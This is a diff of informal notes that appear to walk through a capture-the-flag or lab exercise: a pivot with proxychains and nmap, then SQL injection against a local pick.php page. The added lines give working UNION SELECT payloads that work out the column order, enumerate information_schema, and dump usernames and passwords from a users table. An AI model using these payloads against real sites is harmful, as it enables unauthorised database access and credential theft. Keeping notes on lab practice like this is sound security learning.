@@ -31,9 +31,15 @@ cat /etc/hosts
 did proxychains nmap, came up with ports 22 and port 80 open
 then I made a tunnel to the 80 and went on the website.
 Found it had lists, so i did 
+?product = 7 UNION select 1,2,3;
+it appeared 1 3 2
+?product = 7 UNION select 1,3,2;
+so that means in http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
+it will go  table schema, table name, and column name in order
+select 3 columns, from table_schema.table_name
 http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
 It didn't work on the first product, did prod 7
-did 
+did the following
 http://127.0.0.1:41804/pick.php?product=7 UNION select user_id, name, username from siteusers.users;#
 and found passwords. Passwords are either going to be in ROT13 or Base64, converted they are
 
